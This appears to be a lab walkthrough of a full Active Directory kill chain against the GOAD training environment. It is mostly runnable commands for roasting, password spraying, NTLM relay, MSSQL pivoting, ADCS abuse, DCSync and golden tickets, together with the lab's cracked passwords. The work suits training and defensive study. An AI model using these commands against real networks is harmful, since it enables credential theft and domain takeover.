# GOAD kill chain

Assume Kali at `192.168.56.200`, tools from `kali-docker.md`. Swap the prefix
if the lab uses another `ip_range`.

## §1 Recon

```bash
mkdir -p /logs/nmap /logs/hashes /logs/bloodhound
nmap -Pn -sS --top-ports 1000 --min-rate 1500 -oA /logs/nmap/top \
  192.168.56.10-12,192.168.56.22-23
nxc smb 192.168.56.10-12 192.168.56.22-23
nxc ldap 192.168.56.10-12
nxc mssql 192.168.56.22 192.168.56.23
```

Expect: three DCs (88/389/445/636/3268), CASTELBLACK 80/1433/445, BRAAVOS 1433/445.

Anonymous / null:

```bash
nxc ldap 192.168.56.11 -u '' -p '' --users
nxc smb 192.168.56.11 -u '' -p '' --shares
```

NORTH often allows more anonymous LDAP than the forest root.

## §2 AS-REP roast

```bash
nxc ldap 192.168.56.11 -u '' -p '' --asreproast /logs/hashes/asrep-north.txt
nxc ldap 192.168.56.12 -u '' -p '' --asreproast /logs/hashes/asrep-essos.txt
hashcat -m 18200 /logs/hashes/asrep-north.txt /usr/share/wordlists/rockyou.txt
```

Expected:

- `brandon.stark` → `iseedealpeople` (try `iseedeadpeople` if the hash resists)
- `missandei` → `fr3edom`

## §3 Spray + description

```bash
# user=password
nxc smb 192.168.56.11 -u /logs/users-north.txt -p /logs/users-north.txt --no-bruteforce --continue-on-success
# WinterYYYY
for y in 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026; do
  nxc smb 192.168.56.11 -u rickon.stark -p "Winter$y"
done
nxc ldap 192.168.56.11 -u hodor -p hodor --users --kdcHost winterfell.north.sevenkingdoms.local
```

`samwell.tarly` stores `Heartsbane` in LDAP `description`. `hodor:hodor`.
`rickon.stark:Winter2022`.

## §4 Kerberoast

```bash
nxc ldap 192.168.56.11 -u hodor -p hodor --kerberoasting /logs/hashes/kerb-north.txt
hashcat -m 13100 /logs/hashes/kerb-north.txt /usr/share/wordlists/rockyou.txt
```

`jon.snow` (`HTTP/thewall`) → `iknownothing`. `sql_svc` is intentionally hard.

## §5 BloodHound

```bash
bloodhound-python -u hodor -p hodor \
  -d north.sevenkingdoms.local \
  -dc winterfell.north.sevenkingdoms.local \
  -ns 192.168.56.11 -c All --zip -o /logs/bloodhound
```

Mark owned. Query: shortest path to DA, high-value, Kerberoast, AS-REP,
unconstrained delegation, outbound rights from owned.

Re-collect after every domain hop.

## §6 ACL / GPO (NORTH + SEVENKINGDOMS)

NORTH quick wins once you have a Stark / Night Watch body:

```bash
# SYSVOL scripts — jeor.mormont
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --spider SYSVOL --pattern .bat
# GPO edit — samwell on STARKWALLPAPER
nxc smb 192.168.56.22 -u samwell.tarly -p Heartsbane
```

SEVENKINGDOMS ACE ladder (once any foothold in that domain):

1. tywin `ForceChangePassword` jaime
2. jaime `GenericWrite` joffrey (target SPN / shadow creds)
3. joffrey `WriteDACL` tyron
4. tyron adds self to Small Council
5. Alternate instant: `lord.varys` GenericAll on Domain Admins

```bash
# example: change jaime's password (lab only)
impacket-changepasswd sevenkingdoms.local/tywin.lannister:'powerkingftw135'@192.168.56.10 \
  -newpass 'LabOnly!jaime' -user jaime.lannister
```

Prefer BloodHound edges over memorizing the ladder when edges differ by GOAD version.

## §7 Relay + delegation

eddard.stark (DA) and robb.stark periodically talk LLMNR.

```bash
# terminal 1
responder -I eth0 -wd
# or ntlmrelayx to a coerce-able target / ADCS / SMB
impacket-ntlmrelayx -t smb://192.168.56.22 -smb2support -socks
```

Unconstrained delegation on CASTELBLACK / sansa-flavoured SPNs: coerce a DC
(`printerbug` / `PetitPotam` / `dfscoerce`) then extract the forwarded TGT.

Protected Users (robert.baratheon) will not cache in LSASS the same way.

## §8 MSSQL links (NORTH → ESSOS)

```bash
impacket-mssqlclient north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.22
```

Inside SQL:

```sql
SELECT SYSTEM_USER, USER_NAME();
EXECUTE AS USER = 'arya.stark'; SELECT SYSTEM_USER, USER_NAME(); REVERT;
EXECUTE AS LOGIN = 'sa'; -- samwell path
SELECT * FROM master..sysservers;
-- linked to BRAAVOS
EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT [BRAAVOS];
```

`xp_cmdshell` after sa, then catch a shell as `sql_svc` / `NETWORK SERVICE`.
From BRAAVOS you are in `essos.local`.

## §9 Cross-forest + ESSOS + ADCS

```bash
nxc ldap 192.168.56.12 -u missandei -p fr3edom --asreproast /logs/hashes/asrep-essos2.txt
certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -stdout
# khal GenericAll on ESC4 template → convert to ESC1 and request DA cert
```

jorah: ReadLAPSPassword on the LAPS OU. khal: shadow credentials on viserys;
MSSQL admin on BRAAVOS.

Forest trust attacks (once you have a DA SID in one side): SID history /
`raiseChild` / trust-ticket (`impacket-ticketer` / `raisesild`) depending on
the trust flags BloodHound reports. Re-read the collected trust object
instead of assuming SID filtering is off.

## §10 DCSync / golden / EA

```bash
impacket-secretsdump north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11
impacket-secretsdump sevenkingdoms.local/lord.varys:'_W1sper_$'@192.168.56.10
impacket-secretsdump essos.local/daenerys.targaryen:'BurnThemAll!'@192.168.56.12
```

Golden ticket (lab):

```bash
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <SID> \
  -domain north.sevenkingdoms.local administrator
export KRB5CCNAME=administrator.ccache
nxc smb winterfell.north.sevenkingdoms.local --use-kcache
```

Stop only when KRBTGT is dumped for **all three** domains and you can act as
EA-equivalent in `sevenkingdoms.local`.
